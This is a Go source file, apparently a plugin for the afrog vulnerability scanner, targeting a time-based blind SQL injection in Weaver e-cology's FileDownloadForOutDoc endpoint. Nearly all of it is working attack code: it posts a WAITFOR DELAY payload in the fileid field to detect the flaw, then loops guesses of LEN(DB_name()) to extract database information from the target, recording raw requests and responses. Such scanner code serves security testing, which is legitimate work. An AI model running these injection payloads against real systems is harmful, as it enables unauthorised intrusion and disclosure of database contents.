package gox

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptrace"
	"net/url"
	"strings"
	"time"

	"github.com/zan8in/afrog/v3/pkg/protocols/http/retryhttpclient"
	"github.com/zan8in/afrog/v3/pkg/utils"
	randutil "github.com/zan8in/pins/rand"
	"github.com/zan8in/retryablehttp"
)

func ecologyFiledownloadforoutdocSqli(target string, variableMap map[string]any) error {

	cmd := "DB_name()"
	rint, _ := randutil.IntN(9999)
	url := target + "/weaver/weaver.file.FileDownloadForOutDoc"
	body := fmt.Sprintf("isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:5'", rint)
	if _, _, b := post(url, body); b {
		reqRaw, respRaw, _ := Exp(target, cmd)
		setRequest(reqRaw, variableMap)
		setTarget(target, variableMap)
		setFullTarget(target+"/weaver/weaver.file.FileDownloadForOutDoc", variableMap)
		setResponse(respRaw, variableMap)
	} else {
		setRequest(url, variableMap)
		setTarget(target, variableMap)
		setFullTarget(url, variableMap)
		setResponse("No ecologyFiledownloadforoutdocSqli", variableMap)
	}

	return nil
}

func Exp(target, cmd string) (string, string, int) {

	len := 0
	for i := 1; i < 100; i++ {
		rint, _ := randutil.IntN(9999)
		body := fmt.Sprintf("isFromOutImg=1&fileid=%d IF LEN(%s)=%d WAITFOR DELAY '0:0:5'", rint, cmd, i)
		req, resp, b := post(target, body)
		if b {
			return req, resp, i
		}
	}

	return "", "", len
}

func post(target, body string) (string, string, bool) {
	url2 := target + "/weaver/weaver.file.FileDownloadForOutDoc"
	ctx, cancel := context.WithTimeout(context.Background(), retryhttpclient.GetDefaultTimeout())
	defer cancel()

	req, err := retryablehttp.NewRequestWithContext(ctx, http.MethodPost, url2, strings.NewReader(body))
	if err != nil {
		return "", "", false
	}

	req.Header.Add("User-Agent", randutil.RandomUA())
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	var milliseconds int64
	start := time.Now()
	trace := httptrace.ClientTrace{}
	trace.GotFirstResponseByte = func() {
		milliseconds = time.Since(start).Nanoseconds() / 1e6
	}
	req = req.WithContext(httptrace.WithClientTrace(req.Context(), &trace))

	resp, err := retryhttpclient.RtryNoRedirect.Do(req)
	if err != nil {
		return "", "", false
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", "", false
	}

	delay := int(milliseconds / 1000)

	if delay >= 5 {
		u, err := url.Parse(target)
		if err != nil {
			return "", "", true
		}

		newReqHeader := make(map[string]string)
		rawReqHeaderBuilder := strings.Builder{}
		for k := range req.Header {
			newReqHeader[k] = req.Header.Get(k)

			rawReqHeaderBuilder.WriteString(k)
			rawReqHeaderBuilder.WriteString(": ")
			rawReqHeaderBuilder.WriteString(req.Header.Get(k))
			rawReqHeaderBuilder.WriteString("\n")
		}
		reqPath := strings.Replace(target, fmt.Sprintf("%s://%s", u.Scheme, u.Host), "", 1)
		reqRaw := req.Method + " " + reqPath + " " + req.Proto + "\n" + "Host: " + req.URL.Host + "\n" + strings.Trim(rawReqHeaderBuilder.String(), "\n") + "\n\n" + body

		newRespHeader := make(map[string]string)
		rawHeaderBuilder := strings.Builder{}
		for k := range resp.Header {
			newRespHeader[strings.ToLower(k)] = resp.Header.Get(k)

			rawHeaderBuilder.WriteString(k)
			rawHeaderBuilder.WriteString(": ")
			rawHeaderBuilder.WriteString(resp.Header.Get(k))
			rawHeaderBuilder.WriteString("\n")
		}
		reader := io.LimitReader(resp.Body, retryhttpclient.GetMaxDefaultBody())
		respBody, err := io.ReadAll(reader)
		if err != nil {
			resp.Body.Close()
			return "", "", true
		}
		resp.Body.Close()
		utf8RespBody := utils.Str2UTF8(string(respBody))
		respRaw := resp.Proto + " " + resp.Status + "\n" + strings.Trim(rawHeaderBuilder.String(), "\n") + "\n\n" + utf8RespBody

		return reqRaw, respRaw, true
	}

	return "", "", false
}

func init() {
	funcMap["ecology-filedownloadforoutdoc-sqli"] = ecologyFiledownloadforoutdocSqli
}
